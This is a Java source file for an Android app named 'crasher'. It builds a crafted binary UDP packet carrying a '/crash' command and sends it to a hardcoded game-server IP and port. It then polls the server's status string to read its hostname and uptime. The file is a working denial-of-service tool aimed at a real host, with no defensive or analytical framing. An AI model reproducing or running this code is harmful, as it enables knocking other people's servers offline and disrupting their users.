package pl.mario.crasher;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.Socket;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.xml.*;

import android.os.AsyncTask;

public class Bum extends AsyncTask<String, Void, Bum>{

	/**
	 * @param args
	 *            the command line arguments
	 */

	static String ip = "52.169.31.246";
	static int port = 26002;
	static Crasher o;
	static boolean start;
	static String cmd;

	public Bum(Crasher o, String ip, String port) {
		this.o = o;
		start = false;

		this.ip = ip;
		this.port = Integer.parseInt(port);
		String cmd2 = asciiToHex("/crash ");
		// System.out.println(cmd2);
		cmd = "deadbeef" + "0100000000000000" + "0000" + "0000" + "03ababab" + "01000000ffffffff" + "4E52544D"
				+ "000000" + cmd2 + "badeabee";

		String message = "";

	}

	public void crash() {

		sendPck(cmd);

	}

	public static byte[] hexStringToByteArray(String s) {
		int len = s.length();
		byte[] data = new byte[len / 2];
		for (int i = 0; i < len; i += 2) {
			data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4) + Character.digit(s.charAt(i + 1), 16));
		}
		return data;
	}

	public static String getStatuss() {
		String message = "";
		message = new String(sendStrPck("\\status\\"));
		if (message.isEmpty())
			return "";
		String pom = message.substring(message.indexOf("hostname\\") + 9, message.indexOf("\\hostport"));
		String name = pom;
		pom = message.substring(message.indexOf("uptime\\") + 7, message.indexOf("\\timeleft"));
		int up;
		up = Integer.parseInt(pom);
		String uptime = up / 60 + "h " + up % 60 + "min";
		return name + "		" + uptime;
	}

	private static String asciiToHex(String asciiValue) {
		char[] chars = asciiValue.toCharArray();
		StringBuffer hex = new StringBuffer();
		for (int i = 0; i < chars.length; i++) {
			hex.append(Integer.toHexString((int) chars[i]));
		}
		return hex.toString();
	}

	public static String sendStrPck(String msg) {
		String message = "";
		try {
			InetAddress servAddr = InetAddress.getByName(ip);
			byte buf[] = msg.getBytes();
			DatagramSocket socket = new DatagramSocket();
			socket.setSoTimeout(2000);

			socket.send(new DatagramPacket(buf, buf.length, servAddr, port)); // nastepnie
																				// komende
			buf = new byte[4096];
			DatagramPacket packet = new DatagramPacket(buf, buf.length);
			socket.receive(packet); // odbieramy komende
			socket.close();
			message = new String(packet.getData());
			message = message.trim();
			// message = message.substring(22,message.length()-4);

		} catch (Exception ex) {
			System.out.println("pakiet " + ex);
		}
		return message;
	}

	public static void sendPck(String str) {
		byte[] msg = hexStringToByteArray(str);
		DatagramPacket packet = null;
		try {
			InetAddress servAddr = InetAddress.getByName(ip);
			byte buf[] = msg;

			DatagramSocket socket = new DatagramSocket();
			synchronized (socket) {
				socket.setSoTimeout(2000);

				socket.send(new DatagramPacket(buf, buf.length, servAddr, port)); // nastepnie

				socket.close();
			}
		} catch (Exception ex) {
			System.out.println(Bum.class.getName() + ex);
		}
	}

	public String sendHexPck(byte[] msg) {
		String message = "";
		try {
			InetAddress servAddr = InetAddress.getByName(ip);
			byte buf[] = msg;
			DatagramSocket socket = new DatagramSocket();
			socket.setSoTimeout(2000);
			socket.send(new DatagramPacket(buf, buf.length, servAddr, port)); // nastepnie
																				// komende
			byte[] buff = new byte[4096];
			DatagramPacket packet = new DatagramPacket(buff, buff.length);
			socket.receive(packet); // odbieramy komende
			socket.close();

		} catch (Exception ex) {
			System.out.println("pakiet " + ex);
		}
		return message;
	}

	@Override
	protected Bum doInBackground(String... params) {
		crash();
		return null;

	}

}
